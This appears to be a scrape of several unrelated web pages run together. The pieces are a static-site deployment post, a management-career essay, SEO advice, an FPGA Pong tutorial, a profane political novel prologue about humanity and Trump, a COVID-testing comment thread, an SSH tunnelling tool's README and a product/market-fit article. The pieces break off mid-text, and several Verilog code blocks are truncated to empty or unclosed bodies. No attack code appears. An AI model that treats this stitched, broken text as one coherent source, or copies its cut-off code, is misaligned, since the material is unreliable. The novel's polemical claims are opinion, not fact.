<p>And that’s it, every push of my website source code immediately triggers a build and deployment, all for free.</p>
<p>Here is my configuration for reference:</p>


<h2 id="thats-it-we-have-a-website">That’s it, we have a website</h2>
<p>It really is this simple to build your own custom corner of the internet and serve it for free. I left out some details, specifically my configuration in Cloudflare, but if there is demand I can dive deeper into it.</p>
<h2 id="less-javascript">Less JavaScript</h2>
<p>I hope you’ll join me in adding less unnecessary JavaScript to the internet. It will make you a stronger web developer, and your websites are nearly guaranteed to be faster. There are still of course valid use cases for JavaScript, and perhaps I will explore this topic more in the future as well.</p>

<p>How do you end up being one of those people that manages managers?&nbsp;</p>



<p>This is the beginning of a <a href="https://www.theengineeringmanager.com/managing-managers/">series of articles</a> looking at how you can start working on progressing up the management track beyond an <a href="https://www.theengineeringmanager.com/management-101/">Engineering Manager</a>, and into the world of important-sounding job titles. And meetings. Don’t forget meetings. There’s lots of those.</p>



<p>But those job titles, huh?&nbsp;</p>



<p>You may have looked at roles such as <a href="https://docs.google.com/spreadsheets/d/1weNoeSUfHYOHy9sHKad_ax6qrVXNFlP4ieTwaRll70M/edit#gid=1999769114">Director of Engineering or VP Engineering</a> from afar and imagined just how prestigious it must be to see it shining at the bottom of your email signature as you send a terse and impactful decision to your large organization.</p>



<blockquote><p><em>Yes. Let’s commit to this.</em></p><p><em>——</em></p><p><em>A. Genius, PhD</em></p><p><em>Senior Vice President of Data Science and Engineering</em></p></blockquote>



<p>Maybe you’ve even edited your Twitter profile to see what it would look like in your bio. Don’t worry, we’ve all done it. Hopefully you didn’t accidentally hit save.</p>



<p>Anyway, to that question. How do <em>you</em> get one of these roles?</p>



<p>No doubt you’ve seen <em>Director of…</em>, <em>Head of…</em>, and <em>VP</em> roles advertised externally, especially at large software companies. However, often there’s a Catch-22 situation that you’ll face: they’re typically looking for people who have had experience in doing it before. Or even if they say that they aren’t, what chance are you going to have in the recruitment process if you’re up against others who’ve been there and done that? Now, of course, you might get lucky. But maybe there are ways of preparing to make yourself even more lucky.</p>



<p>Let’s think about getting yourself prepared for making the leap to managing managers. I believe that you stand the most chance of being able to make the next progression step if you find yourself at the union of a majority of the following characteristics and situations:</p>



<ul><li><strong>You’ve been an Engineering Manager for a decent amount of time</strong> (say, 2-5 years) and have a provable track record of shipping and people management, with references that can back you up. After all, if you’re going to be running multiple teams, you’re going to need to know how to run one team inside out. (If you’re still working on that, there’s plenty of material on the rest of this site to help you skill up.)</li><li><strong>You’re already working for a company with a strong management culture</strong> that has clear career progression tracks for managers as well as individual contributors. This means that if the role opens up where you already work, it’s clear how to put yourself forward for it. It’ll also mean you’re learning and practicing the right skills.</li><li><strong>You’re at a company that is changing fast</strong> and has a tendency to not quite be able to keep up with the chaos. This often occurs during periods of rapid growth, or even via shake-up – through downsizing, mergers and acquisitions – any event that begins to question the current shape of the org chart being correct for the foreseeable future.</li><li><strong>You have a good presence online</strong> via the usual social channels: LinkedIn, Twitter, Github, and so on. This way if people are trying to find people like you elsewhere, then they can.</li></ul>



<p>Now, of course, it is entirely plausible that you may apply cold for a Director of Engineering role as an external applicant whilst currently being an Engineering Manager. That’s what I meant by getting lucky above. Quite often more senior engineering management positions are either specifically headhunted or promoted from within.&nbsp;</p>



<p>But why is this?</p>



<ul><li><strong>The more senior the managerial position, the more risky a bad hire is</strong>. That’s why excellent internal candidates always have the upper hand: they are a known entity that likely already has domain knowledge. They’re also far more likely to have the company take a chance on the new gig working out. Even better: smart companies will do a 30-60-90 plan that allows the promoted member of staff to revert back to their old role amicably if it’s not working out.</li><li><strong>Good companies will look out for their own staff first</strong> and seize opportunities to offer career progression in order to retain existing talent. I don’t have any statistics on how many manager of manager roles that get filled and are never advertised externally, but I’d reckon it’s maybe in the 70%+ region. If you hire good people consistently, you’ll always have someone great progressing up through the ranks. Why look elsewhere, unless you specifically need to bring in someone specific, such as a candidate with key domain knowledge that is lacking at the company?</li><li><strong>The need to find a manager of managers (in my experience) is rarely something that undergoes extensive planning</strong>. During periods of rapid growth, the number of staff in the department may start stacking up to the point that existing teams need to be split into smaller ones, thus greating opportunities for a node in the org chart above those teams. Sometimes an existing manager of managers will quit and filling that void internally, on a tight timeline, is much easier than reaching outside of the company. Or perhaps two organizations merging together create a bunch of empty nodes in the org chart needing urgently to be filled. Often you look within.</li></ul>



<p>These are all opportunities that you can more likely seize if you make sure you’re already working for an ambitious, high growth company and are doing a stellar job of running a team. This is no small feat in itself, mind you.</p>



<p>Start-ups, or smaller high growth companies in general, are great for giving yourself this opportunity, especially ones that have just received a new venture capital investment. An injection of money means an injection of people, and that then creates more opportunities for leading them as the org chart adapts. <a href="https://www.theengineeringmanager.com/book/">I advocated strongly for the managerial opportunities that high growth start-ups can offer you in the penultimate chapter of my book</a>. After all, how do you reckon many CTOs became CTOs for the first time?</p>



<p>So where am I going with this? To use the cheesiest quote, you’ve gotta skate where the puck is going. (Thanks Wayne.) Yes, you can keep an eye on external adverts and apply to anything and everything and hope that you land the job. However, depending on where you currently work, it may be more fruitful to change role sooner at your <em>current</em> level – which is often easier – in order to stand more of a chance of upward growth over time.</p>



<p>There are parallels here with the early stages of an individual contributor’s career. It’s often really hard to land that first job because the applicant has yet to be able to prove themselves. However, once they’ve stuck around for a few years and have gained experience by shipping lots of code, they find themselves having to bat the recruiters away.</p>



<p>The exact same thing is true about progressing further up the management track. Getting your first management role is tough, but you only have to do it once to prove you can do it again. The same is true about the next step of managing managers. People often grow from within by being excellent performers and then working their way upwards.</p>



<p>If you’re looking to grow from managing individual contributors to managing managers, have a think about the following points.</p>



<ul><li><strong>How likely is it that this will be possible at your current company within a reasonable timeframe?</strong> If it’s not, you might need to look elsewhere sooner rather than later.</li><li><strong>Is your current Engineering Manager role defined similarly to how other notable companies in the industry define it?</strong> If not, why not? The more your current EM role fits that of the best employers in the industry, the better chance you have of moving sideways and upwards.</li><li><strong>How many years of experience in this role do you have?</strong> I would expect a manager of managers to be a high growth EM with at least a few years of tenure.</li><li><strong>What notable infrastructure, features or products have you shipped whilst being an EM?&nbsp;</strong></li><li><strong>Are you seen as an influential person in your current department?</strong> Do people outside your team seek your advice? If not, why not?</li><li><strong>Have you coached anyone outside of your team?</strong> If not, then I’d advise you to start giving it a go.</li><li><strong>Have you found anyone else doing this role, either in your existing company, your network or online?</strong> Get in touch with them to see if they’ll have a chat with you about what it’s like to do that job, and ask them how they got into it. What changed for them when compared to just running one team? What happened to their time to contribute technically? </li></ul>



<p>What’s your current story? Does it feel like you’re ready for the next step? Have you already been working at the level of your next promotion?</p>



<p>If you’re not familiar with the management career progression path in general then you can check out the career tracks of other companies, <a href="https://docs.google.com/spreadsheets/u/1/d/1weNoeSUfHYOHy9sHKad_ax6qrVXNFlP4ieTwaRll70M/edit#gid=1999769114">including our own</a> from Brandwatch, on <a href="https://www.progression.fyi/">progression.fyi</a>.</p>



<p>If you’re seeking out others to talk to about it, then you could use LinkedIn, Twitter, or Slack communities such as <a href="https://lead-dev-slack.herokuapp.com/">The Lead Developer</a>, <a href="https://ctocraft.com/community/">CTO Craft,</a> or the <a href="https://randsinrepose.com/welcome-to-rands-leadership-slack/">Rands’ Leadership group</a> to do so. </p>



<p>While you ruminate on these, I’ll be expanding out my own thoughts and experiences of doing the job for a number of years in the forthcoming series of articles that I’ll be hosting under the <a href="https://www.theengineeringmanager.com/managing-managers/">Managing Managers</a> section of the website.</p>



<p>Until the next one, good luck!&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Over the years, I've worked on building search traffic for two kinds of sites.</p> <p>The first, was working for companies that already had hundreds of thousands or millions of monthly users and were trying to build their traffic via a team of writers. I did this first for Verbling (as a side component to my work as a full-time dev), and then later for Codementor, as a remote growth consultant.</p> <p>The second, was my own sites or apps where 100% of the content was produced by me. I've also helped several other independent solo-founders do essentially the same for their own projects. Today's advice is for 2nd type of site—the ones with just one writer.</p> <p>For a quick point of reference, I'll what I'm currently working on so you can get an idea of how applicable my experience is or isn't to you:  <a href="https://alchemist.camp/" target="_blank" rel="noopener noreferrer">Alchemist Camp</a>. It targets an extremely small programming niche and is hovering around Alexa 700k (10-15k uniques/month with decent visit time). I add new content about once a week. Previously, I built a considerably larger personal blog that peaked at about Alexa 300k, but it's no longer up.</p> <h2 id="work-with-the-search-engine"><a href="#work-with-the-search-engine">#</a> Work <em>with</em> the search engine</h2> <p>There's a lot of competition for attention from search engines and an entire industry of people trying to game them. It's possible to do that successfully in the short term, but people who do that generally get crushed when new search ranking updates. The more egregious marketers sometimes get penalized or banned entirely.</p> <p>There are certain technical SEO basics to pay attention to, such as having a reasonable site structure, a sitemap and appropriate meta-tags. I'm going to assume you've got that covered. WordPress or any other modern CMS will do an adequate job out of the box.</p> <p>So with the above assumptions, what's a good way to cut through the competition?</p> <h2 id="pay-attention-when-a-search-is-frustrating"><a href="#pay-attention-when-a-search-is-frustrating">#</a> Pay attention when a search is frustrating</h2> <p>The single most successful strategy I've found for getting search engine traffic for a more niche site has been to pay very close attention when something is difficult to find online. This isn't very difficult to do, since it's easy to notice when something is frustrating. The key is to be aware and take notes.</p> <p>Look at your browser history and write down <em>the exact queries</em> you typed into Google, Duckduckgo or your search engine of choice. Ask yourself <em>what</em> you were hoping to find online and why you tried each query after the first.</p> <h2 id="create-what-you-hoped-your-search-would-find"><a href="#create-what-you-hoped-your-search-would-find">#</a> Create what you hoped your search would find</h2> <p>Then, after you've learned what you were trying to learn during your frustrating search, create the very thing you were trying to find.</p> <p>Usually a search is difficult because the ideal answer doesn't exist in a single document online or video. Instead, finding the answer involves piecing the information together from numerous sources. If that was the case with your frustrating search, then the next step is to create the answer to the search and publish it.</p> <p>Occasionally after a long and frustrating search, you <em>will</em> find a single resource that answers exactly what you wanted. In this case the question is, "Why didn't my first several searches return this document?" Maybe it used different terminology than you did. Maybe it was comment on an ancient forum post. Maybe it was on an extremely slow site. Make your own version of the resource you finally found, but fix whatever issue made it difficult to find.</p> <h3 id="an-example"><a href="#an-example">#</a> An example</h3> <p>One direct example of using this strategy was when it took me about 20 minutes of searching to find out how to do a certain kind of query with Elixir's main DB-related library, Ecto. Elixir maps are stored in Postgres as JSONB fields, and I wanted to query fields within the JSONB.</p> <p>I saw I'd made 8 searches, starting with <em>"query nested fields of a map ecto"</em>. Ultimately the whole answer to what I was looking for was split between a Thoughtbot post, a Stack Overflow answer and a Postgres documentation page.</p> <p>Then I wrote a short article called, <a href="https://alchemist.camp/articles/querying-nested-map-ecto" target="_blank" rel="noopener noreferrer">Querying nested fields of a map with Ecto</a> that contained exactly the information I'd been looking for, and it's since brought in a thousand visitors from search in under a year.</p> <h2 id="why-does-this-work"><a href="#why-does-this-work">#</a> Why does this work?</h2> <p>This strategy tends to be stable because it works with the search engine and doesn't tend to get crushed by updates the way more aggressive techniques do. It leads to creating genuinely helpful resources for people to find online and Google has every incentive to return them in its results.</p> <p>Content created this way tends to rank well because the entire strategy revolves around escaping competition. If there is a lot of competition around a query, it's generally well-answered and you'll find an adequate (though possibly spammy, advertising-stuffed) result within a search or two. The searches that are <em>really</em> frustrating are usually not going to have much competition.</p> <p>Unless your interests are <strong>truly</strong> rare, others will search for what you did and find your page.</p>  <br></div></div>]]>

      <p>Welcome back to <em>Exploring FPGA Graphics</em> with Project F. In this series, we’ll be experimenting with FPGA graphics of all kinds, from a simple square, through Pong, sprites, and the Mandelbrot set, to 2D drawing, and even simple 3D modelling. New to the series? Start with <a href="https://projectf.io/posts/fpga-graphics/">Exploring FPGA Graphics</a>.</p>
<p>In the previous part, we got an <a href="https://projectf.io/posts/fpga-graphics/">introduction to FPGA graphics</a>, now we’re ready to put our graphical skills to work, by recreating the arcade classic: Pong.</p>
<p><em>Revised 2020-08-14. Get in touch with <a href="https://twitter.com/WillFlux">@WillFlux</a> or open an <a href="https://github.com/projf/projf-explore/issues">issue on GitHub</a>.</em></p>
<h3 id="requirements">Requirements</h3>
<p>For this series, you need an FPGA board with video output. We’ll be working at 640x480, so pretty much any video output will do. You should be comfortable with programming your FPGA board and reasonably familiar with Verilog.</p>
<p>We’ll be demoing with these boards (FPGA type):</p>
<ul>
<li><strong><a href="https://github.com/icebreaker-fpga/icebreaker">iCEBreaker</a></strong> (Lattice iCE40) with <strong><a href="https://github.com/icebreaker-fpga/icebreaker">12-Bit DVI Pmod</a></strong></li>
<li><strong><a href="https://reference.digilentinc.com/reference/programmable-logic/arty-a7/reference-manual">Digilent Arty A7-35T</a></strong> (Xilinx XC7) with <strong><a href="https://reference.digilentinc.com/reference/pmod/pmodvga/reference-manual">Pmod VGA</a></strong>
<ul>
<li>The Arty version of Pong is still being tested and will be released soon</li>
</ul>
</li>
</ul>
<p>Follow the source <a href="https://github.com/projf/projf-explore/tree/master/fpga-pong">README</a> to quickly build a project for either of these boards.</p>
<blockquote>
<p><strong>iCEBreaker with VGA Pmod</strong><br>
The first part of this series included VGA designs for iCEBreaker. Maintaining three sets of designs was a significant overhead, so the iCEBreaker VGA version has been dropped from the examples.</p>
</blockquote>
<h3 id="source">Source</h3>
<p>All the Verilog designs featured in this series are available in the <a href="https://github.com/projf/projf-explore/">Exploring FPGAs repo</a>, and source links are included throughout the blog. The designs are open source under the permissive MIT licence, but this blog is subject to normal copyright restrictions.</p>

<p><strong>Pong</strong> may not have been the first computer game, but it has an excellent claim to being the first to break into public consciousness when it was released in 1972. Originally an arcade cabinet, it was quickly adapted to be played at home attached to a television. If you’d like to learn more about the early history of Atari, including Pong, I recommend <em><a href="https://mitpress.mit.edu/books/racing-beam">Racing the Beam</a></em> by Nick Montfort and Ian Bogost.</p>
<p><em>ProTip: If you’re unfamiliar with Pong gameplay, check out this <a href="https://www.youtube.com/watch?v=it0sf4CMDeM">Pong video</a> on YouTube.</em></p>

<h3 id="pong-v1">Pong v1</h3>
<p>We can use the ball and paddle logic to create a first version of the top module for Pong:</p>
<ul>
<li>Xilinx XC7: <em>coming soon</em></li>
<li>Lattice iCE40: <strong><a href="https://github.com/projf/projf-explore/blob/master/fpga-pong/ice40/top_pong_v1.sv">ice40/top_pong_v1.sv</a></strong></li>
</ul>
<p>To build this example, you’ll also need the display timings, clock generation, and constraints, that we created in the first part of the series. All these files are available in the <a href="https://github.com/projf/projf-explore/tree/master/fpga-pong">FPGA Pong repo</a> together with a makefile for iCEBreaker, and Vivado project for Arty.</p>
<h2 id="collision">Collision</h2>
<p>It’s briefly fun to watch the ball crawl around the screen with the paddles, but this isn’t exactly a game, even a demo of one: the ball shows a blatant disregard for the paddles.</p>
<p>To test for paddle collision, we take advantage of the drawing signals: if we’re drawing the ball and a paddle at the same time, then there’s a collision. The collision occurs during the drawing process, so we need to store it and use it when we next animate.</p>
<div><pre><code data-lang="verilog"><span>logic</span> p1_col, p2_col;
<span>always_ff</span> @(<span>posedge</span> clk_pix) <span>begin</span>

    <span>end</span>
<span>end</span>
</code></pre></div><p>We reset the collision detection when we receive the <code>animate</code> signal. However, the value of <code>col_p1</code> and <code>col_p2</code> is available until the next clock tick, so the ball animation can always use it.</p>
<p>Update the horizontal ball animation to check for paddle collisions:</p>

</ul>
<h2 id="controls">Controls</h2>
<p>So far the FPGA has been playing against itself. If you want to get in on the action, we need to add some controls. We’re going to use three buttons: up, control, and down.</p>
<p>Add the buttons to the top module ports:</p>
<div><pre><code data-lang="verilog">    <span>input</span>  <span>wire</span> <span>logic</span> btn_up,       <span>// up button
</span><span></span>    <span>input</span>  <span>wire</span> <span>logic</span> btn_ctrl,     <span>// control button
</span><span></span>    <span>input</span>  <span>wire</span> <span>logic</span> btn_dn,       <span>// down button
</span></code></pre></div><p>We need to map these buttons to FPGA pins in the constraints file. You’ll be happy to hear I’ve already done this for you:</p>
<ul>
<li>Xilinx XC7: <em>coming soon</em></li>

</ul>
<p>To safely use buttons in our design, we need to debounce them. Debouncing ensures we get a single, clean, transition from button presses. The debounce module looks like this:</p>
<div><pre><code data-lang="verilog"><span>module</span> debounce (
    <span>input</span>  <span>wire</span> <span>logic</span> clk,  <span>// clock

        <span>end</span>
    <span>end</span>
<span>endmodule</span>
</code></pre></div><p>We want continuous signals for up and down, but a one-off event for the control button:</p>
<div><pre><code data-lang="verilog">    <span>logic</span> sig_ctrl, move_up, move_dn;
    debounce deb_btn_ctrl (.clk(clk_pix), .in(btn_ctrl), .out(), .ondn(), .onup(sig_ctrl));
    debounce deb_btn_up (.clk(clk_pix), .in(btn_up), .out(move_up), .ondn(), .onup());
    debounce deb_btn_dn (.clk(clk_pix), .in(btn_dn), .out(move_dn), .ondn(), .onup());
</code></pre></div><p>The <code>onup()</code> and <code>ondown()</code> outputs work like traditional UI events. In this case, <code>sig_ctrl</code> will be high for one tick when the control button is released.</p>
<p>We start with two states:</p>
<ul>
<li><strong>IDLE</strong> - both paddles are controlled by the AI (demo)</li>
<li><strong>PLAY</strong> - enable player paddle</li>
</ul>
<p>Pressing the control button switches between these states, while the up and down buttons are used to control the paddle.</p>

<p><strong>A Very Good Novel (Coronavirus)</strong></p>
<p><em>by Christopher Damitio</em></p>

<p><em><strong>Prologue – A History of the World and Her Apes</strong></em></p>
<p>Once upon a time there was a beautiful planet filled with chaotic and beautiful landscapes, flora, fauna, and amazing oceanic and geologic events. Things pretty much went the way things go on any planet with life – there were good times, there were bad times, there were mass extinctions, there were cataclysmic events that included but were not limited to meteors, tsunamis, volcanoes, earthquakes, ice ages, and much more. And so it went…</p>
<p>The planet produced life in abundance – and killed that life in abundance. Sometimes the planet used one form of life to kill other forms of life. Sometimes, the planet took a break and simply enjoyed a necessary state of homeostasis.</p>
<p>It was during one of these periods of restful equilibrium that the monkeys and apes started fucking things up. It’s a long story and it’s been told many times – I don’t want to bore you with all the details so I’m going to summarize it in as little space as possible.</p>
<p><em>Purgatoria</em> were built to fuck. They fucked and they fucked and they fucked. As a result of always fucking and always looking for something else to fuck – these little fuckers spread throughout Eurasia and Africa and became the common ancestor for all of the family of animals known as primates. The primates all kept their ancestor’s proclivities for making new descendants and also for filling pretty much any unoccupied ecological niche they might come across. This led to the diversity of primates knows as lemurs, lorises, bush babies, tarsiers, old world monkeys, new world monkeys, and apes. While each of those branches is interesting, it’s the apes we will focus on because they also kept doing what they did best – which eventually led to many different &nbsp;species of ‘human’ living at the same emergent time. This was all in the blink of the planet’s eye, so she didn’t really notice.</p>
<p>The human species interbred, migrated, adapted, and began to fight for space. A particularly nasty branch of the humans fucked, killed, ate, and exterminated all the other branches. Bye bye <em>Homo habilis, Homo rudolfensis, Homo erectus, Homo heidelbergensis, Homo rhodesiensis, Neanderthal, Denisovan, Homo florensis,</em> and <em>Homo luzonensis</em> – and hello <em>Homo sapiens</em> – the one and only survivor of the great human wars. There can only be one – at least there can only be one if the winner is Homo sapiens because these things were the most illogical and selfish creatures that planet had ever spawned.</p>
<p>Oh, I can hear you right now…but wait, I’m one of those – you (me) you’re one of those! We’re not so bad. Think about Martin Luther King and Jesus and Helen Keller and ….</p>
<p>Okay, yes, I admit it. Some of us, some humans are good – but unfortunately, that is a weak aberration from the species norm, not the default setting. Those good humans – they deserve to be worshipped, revered, and treated with respect – listened to. It’s true, there are some very very very very very good humans – and they usually get killed by the others, then, when they are dead their message or their life is twisted around and used to help some other human either literally or metaphorically fuck as many other humans as possible. In truth, the only thing that kept the human species going was the fact that they loved to fuck so much – and the natural result of that was more humans and since they didn’t blink at incest for most of their existence, they didn’t blink at any atrocity that most other animals avoided – in fact – they became progressively more and more brutal, vicious, and conniving, while also becoming completely insane and – frankly – fucking evil. Humans were evil.</p>
<p>In the space of a few thousand years they wiped out the other human species, created huge tribal empires, dehumanized each other, normalized enslaving and committing genocide upon one another, and developed mad genius processes that included but were not limited to chemical warfare, nuclear warfare, wage slavery, corporate capitalism, and industrial production paired with military conquest. These were things that no sane animal would think of – but, as we’ve established – these were not rational animals – they were completely and totally fucking insane.</p>
<p>So, moving on – they poisoned rivers, lakes, oceans, the sky, the land, and each other. They literally shit where they ate over and over and then coined phrases of remarkable wisdom such as ‘Don’t shit where you eat”. They leveled mountains, flattened forests, exterminated entire species, caged everything they could, enslaved each other using chains, whips, guns, technology, and psychological techniques – and – and this is the amazing part – the whole while they were doing this they were patting themselves on the back and congratulating themselves on ‘progress’. &nbsp;They wrote declarations and manifestos and they declared human rights and universal brotherhood – and all the whole they came up with new ways to stick it to each other.</p>
<p>Jesus and Buddha and others came and said wise things that generally came down to “Don’t treat each other like shit because you don’t want to be treated like shit and neither does anyone else”. Jesus got nailed to some sticks and Buddha got fed some rancid meat. JP Morgan came along and said “Hey, these guns are really cheap and they blow up in your face if you try to shoot them, but I can buy them cheap and sell them to the people fighting against slavery (but really most of them were probably fighting for other reasons – but let’s not go there) and make a huge profit.” And he did, and the people worshipped him for it, just as they had worshipped the slave owning traitor who founded their country and all the tyrants, kings, dictators, and despots of the past.</p>
<p>Yes, I hear you again “Slave owning traitor? You mean the founder of the United States? General George Washington?” Yes, a man who bought and sold other humans and swore an oath more than once to support the King of England and then betrayed that oath and led an uprising so he could make more profit and buy more slaves.</p>
<p>In any event, I don’t mean to pick on ‘General’ Washington. He was no worse than most of the other power hungry men around him and considerably better than many – depending on how you define the term better. &nbsp;In any event, he started a country, defined a way of rule and made sure that the power stayed in his court – until he was pretty sure that the power he had was secure – then he nobly stepped away.</p>
<p>For the next two hundred and forty four years his country ran with a charade that they were the defenders of man, the beacon of liberty, and the bastion of hope and democracy. All the while, his country was enslaving, committing genocide, breaking treaties, stealing land, raping, pillaging, and figuring out new ways to do all of the above without sounding like the bad guy. If ever there was a winner of the war on hearts and minds, it was the United States of America from about 1776-2016. Even when they fought wars for made up reasons or invaded countries to take their resources – the USA always was able to justify itself as the ‘policeman of the world’ or the ‘defender of democracy’ – which is pretty funny if you think about it and ignore the millions of dead and suffering that came from it. The USA developed the atomic bomb and even though the war was more or less over – dropped a couple of them on Japan, just to make sure they knew they had lost – the 100,000 killed in the firebombing of Tokyo just wasn’t enough.</p>
<p>I could go on – I could justify what I am saying, I could point to sources and references – but justification is one of the things we do best and if you don’t want to agree with me, I have confidence that your ability to justify your position will be at least equal to my ability to justify mine. Humans can steal from a poor person (a person much poorer than themselves) and then find a good reason for why that was the right thing to do. It’s amazing and it’s true – so I will quit trying to justify. I don’t want to get bogged down in Vietnam, Iraq, or Afghanistan – I want to tell my story.</p>
<p>Technology and corporate capitalism created a perfect storm for total human control. It was easy to convince almost all of the humans that they deserved to have a better life than all of the other humans. It was easy to convince almost all of those humans that they had a chance to have a better life than all of those other humans. And with that done – it was easy to get all the humans to point their fingers at each other and blame those with less power than themselves for them not having as much power as they wanted.</p>
<p>Social media and data analytics made it easy to manipulate huge swaths of the population. The bizarre result was millions of poor people voting for an exploitive billionaire, millions of ‘business people’ voting for a business person who had lost far more than he had created, millions of ‘Christians’ to vote for the least Christian person ever, millions of Jewish people to vote for a guy who repeatedly made Nazi references, and millions of women to vote for a rapist.</p>
<p>In truth, Donald John Trump, was the pinnacle of human evolution. He was everything that humans had been heading towards since those long ago days when multiple human species were clubbed to death by Homo sapiens. If ever there was a perfect example of humanity, Trump was it. And after the election of 2016, he finally took his place as the most powerful primate in the world. One thing was certain, he was never going to let go of that power.</p>

Thank you for your article. It is my understanding the the qPCR testing currently in use also detects non replication capable rna (not virus) as well as possible virus? In fact as low as 80-100 pieces of rna per ml will produce a positive result. Wouldn’t you call a positive result of non virus a false positive? When we get one of these “positive“ results from this type of testing are we not quarantining contacts? Typically aren’t we testing at onset of symptoms? Isn’t maximum viral shedding, (infectiousness) 2.1 days before the onset of symptoms? We are in a pandemic and all testing has its place in the fight. Here are the instructions for the home test kit “ If you test positive Stop and immediately contact your health care provider or local health department as you may be contagious. If your result is negative act as if you never took the test and continue to follow your local heath department guidance. Why can’t we leave it up to the people and institutions to figure out the implementation? How many people have to die waiting for sociologists to evaluate the societal effect of false positives? By the way does anyone have a better idea than Dr.&nbsp;Mina’s. Daily home tests of contagiousness is the answer.

<pre><code>&gt; Thank you for your article.</code></pre>
<p>You are welcome. Thank you for reading and responding.</p>
<pre><code>&gt; Wouldn’t you call a positive result of
&gt; non virus a false positive?</code></pre>
<p>In effect, yes. But now it’s a matter of definitions. What do we want to be positive or negative?</p>
<p>Your points are well worth considering, but my point was that false positives do harm, as well. What kind of testing regime to implement is a public health policy decision. It should be informed by all considerations of probable harm or benefit, including sociological ones.</p>

      <p><strong>Mole</strong> is a <em>cli</em> application to create <em>ssh</em> tunnels focused on resiliency
and user experience.</p>

<div><div><pre><code><span>$ </span>mole start <span>local</span> <span>--remote</span> :3306 <span>--server</span> my-database-server
INFO[0000] tunnel channel is waiting <span>for </span>connection      <span>destination</span><span>=</span><span>"127.0.0.1:3306"</span> <span>source</span><span>=</span><span>"127.0.0.1:32863"</span>
</code></pre></div></div>

<p><strong>Highlighted Features</strong></p>

<ul>
  <li><a href="#let-mole-to-randomly-select-the-source-endpoint">Auto address selection</a>: find a port available and start listening to it, so the <code>--source</code> flag doesn’t need to be given every time you run the app.</li>
  <li><a href="#create-multiple-tunnels-using-a-single-ssh-connection">Create multiple tunnels using a single ssh connection</a>: multiple tunnels can be established using a single connection to a ssh server by specifying different <code>--destination</code> flags.</li>
  <li><a href="#create-an-alias-so-there-is-no-need-to-remember-the-tunnel-settings-afterwards">Aliases</a>: save your tunnel settings under an alias, so it can be reused later.</li>
  <li>Leverage the SSH Config File: use some options (e.g. user name, identity key and port), specified in <em>$HOME/.ssh/config</em> whenever possible, so there is no need to have the same SSH server configuration in multiple places.</li>
  <li>Resiliency! Then tunnel will never go down if you don’t want to:
    <ul>
      <li>Idle clients do not get disconnected from the ssh server since Mole keeps sending synthetic packets acting as a keep alive mechanism.</li>
      <li>Auto reconnection to the ssh server if the it is dropped by any reason.</li>
    </ul>

<h4>TL;DR</h4>
<div><p>
Sean Ellis (early Dropbox, Eventbrite) found leading indicator for product/market fit.
<b>Just ask users "How would you feel if you could no longer use our product?" and measure the percent who answer "Very disappointed"</b></p><p>

If the percentage is above the 40%, you did it — you got to product/market fit.

This article is by <a target="_blank" rel="noopener nofollow" href="https://www.linkedin.com/in/rahulvohra/">Rahul Vohra</a>, the founder and CEO of <a target="_blank" href="https://superhuman.com/">Superhuman</a> — a startup building the fastest email experience in the world.

<p>
We’ve all heard that product/market fit drives startup success — and that the lack thereof is what’s lurking behind
almost every failure.
</p>
<p>
For founders, achieving product/market fit is an obsession from day one. It’s both the hefty hurdle we’re racing
to clear and the festering fear keeping us up at night, worried that we’ll never make it.
But when it comes to understanding what product/market fit really is and how to get there, most of us quickly realize that
there isn’t a battle-tested approach.
</p>
<p>
In the summer of 2017, I was waist-deep in my search for a way to find product/market fit for my startup, Superhuman.
Turning to the classic blog posts and seminal thought pieces, a few observations stuck out to me.
Y Combinator founder Paul Graham described product/market fit as when you’ve <a target="_blank" href="http://www.paulgraham.com/13sentences.html">made something that people want</a>,
while Sam Altman <a href="http://blog.samaltman.com/before-growth">characterized</a> it as when users spontaneously tell other people to use your product.
But of course, the most cited description comes from this passage in Marc Andreessen’s 2007 blog post:
</p>
<p>
“You can always feel when product/market fit is <b>not</b> happening.
The customers aren't quite getting value out of the product, word of mouth isn't spreading, usage isn't growing that
fast, press reviews are kind of ‘blah,’ the sales cycle takes too long, and lots of deals never close.
</p>
<p>
And you can always feel product/market fit when it is happening. The customers are buying the product just as
fast as you can make it — or usage is growing just as fast as you can add more servers. Money from customers
is piling up in your company checking account. You're hiring sales and customer support staff as fast as you can.
Reporters are calling because they've heard about your hot new thing and they want to talk to you about it.
You start getting entrepreneur of the year awards from Harvard Business School.
Investment bankers are staking out your house.”
</p>
<p>
For me, this was the most vivid definition — and one that I stared at through tears.
</p>
<p>
We had set up shop and started coding Superhuman in 2015. A year later, our team had grown to seven and we were still furiously coding. By the summer of 2017, we had reached 14 people — and we were still coding. I felt intense pressure to launch, from the team and also from within myself. My previous startup, <a target="_blank" rel="noopener nofollow" href="http://rapportive.com/">Rapportive</a>, had launched, scaled and been acquired by LinkedIn in less time. Yet here we were, two years in, and we had not passed go.
</p>
<p>
But no matter how intense the pressure, I wasn’t ready to launch. Common practice would be to "throw it out there and see what sticks,” which may be fine after a few months of effort when the sunk cost is low. But the “launch and see what happens” method seemed irresponsible and reckless to me — especially given the years that that we had invested.
</p>
<p>
<img alt="Rahul Vohra, Founder of Superhuman" src="https://pmfguru.com/assets/blog/Rahul-Vohra-22cbde9d5bf1eefdec11bb9c0b818b2347fbfba9465266a1c73df5333c710d03.jpg">
</p><p><small>Handsome Rahul Vohra, Founder of Superhuman</small>
</p>

<p>
Further compounding the pressure, as a founder, I couldn’t just tell the team how I felt. These super-ambitious engineers had poured their hearts and souls into the product. I had no way of telling the team we weren’t ready, and worse yet, no strategy for getting out of the situation — which is not something they would want to hear. I wanted to find the right language or framework to articulate our current position and convey the next steps that would get us to product/market fit, but was struggling to do so.
</p>
<p>
That’s because the descriptions of product/market fit I found were immensely helpful for companies <em>post-launch</em>. If, after launch, revenue isn’t growing, raising money is tough, the press doesn't want to talk to you and user growth is anemic, then you can safely conclude you don't have product/market fit. But in practice, because of my previous success as a founder, we didn’t have problems raising money. We could have gotten press, but we were actively avoiding it. And user growth wasn't happening because we deliberately choosing not to onboard more users. We were pre-launch — and we didn’t have any indicators to clearly illustrate our situation.
</p>
<p>
The descriptions of product/market fit all seemed so post hoc, so unactionable. I had a clear understanding of where we stood, but I had no way of conveying that to others — and no plan for the part that should come next.
</p>
<p>
So I racked my brain for an answer on how to travel the distance between where Superhuman was and the high bar that we needed to hit. And I eventually started to wonder: <b>what if you could measure product/market fit?</b> Because if you could measure product/market fit, then maybe you could optimize it. And then maybe you could systematically increase product/market fit until you achieved it.
</p>
<p>
